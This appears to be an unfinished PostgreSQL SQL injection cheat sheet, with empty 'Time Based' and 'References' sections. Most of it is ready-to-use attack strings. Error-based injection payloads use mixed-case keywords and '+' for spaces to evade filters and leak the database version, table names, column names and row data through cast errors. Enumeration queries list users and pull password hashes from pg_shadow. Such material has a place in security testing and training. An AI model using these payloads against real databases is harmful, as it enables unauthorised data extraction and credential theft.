# PostgresSQL

## PostgreSQL Comments
```
--
/**/ 
--------------------------------------------------
SELECT 1; –comment
SELECT /*comment*/1;
```

## PostgreSQL Error Based - Basic
```
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
```
## PostgreSQL Time Based


# -------------------------------------------------------------------------------

Version	
``` 
SELECT version()
```
Comments	
```
SELECT 1; –comment
SELECT /*comment*/1;
```
Current User	
```
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```
List Users	
```
SELECT usename FROM pg_user
```
List Password Hashes
```
SELECT usename, passwd FROM pg_shadow — priv
```

## References:
